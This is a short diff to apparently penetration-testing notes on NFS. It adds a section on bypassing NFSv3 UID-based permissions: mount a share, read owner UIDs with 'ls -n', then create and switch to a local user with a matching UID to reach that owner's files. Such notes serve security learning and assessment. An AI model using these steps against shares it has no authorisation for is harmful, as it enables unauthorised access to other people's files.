@@ -20,6 +20,7 @@ cat /proc/mounts
 ```
 
 # Exploiting NFS
+## Bypassing UID permissions
 
 Older NFS versions such as `NFSv2` and `NFSv3` lack robust authentication and authorisation mechanisms and can be easily bypassed to gain unauthorised access to shares on the file system or privileged access.
 
@@ -27,4 +28,13 @@ Older NFS versions such as `NFSv2` and `NFSv3` lack robust authentication and au
 ```
 mount -o vers=3 <IP_ADDRESS>:/<SHARE> <MOUNT_POINT>
 ```
-`NFSv3` allows you to view the UIDs of mount owners, therefore once you have retrieved the UID, you can remount to the NFS export with the spoofed UID and gain access.  
+```
+ls -n
+```
+With `NFSv3`, you can view the UIDs of mount owners; therefore, once you have retrieved the UID, you can remount to the NFS export with the UID of a particular mount owner and gain access.  
+```
+sudo useradd -u <UID> <USERNAME>
+```
+```
+su <USERNAME>
+```
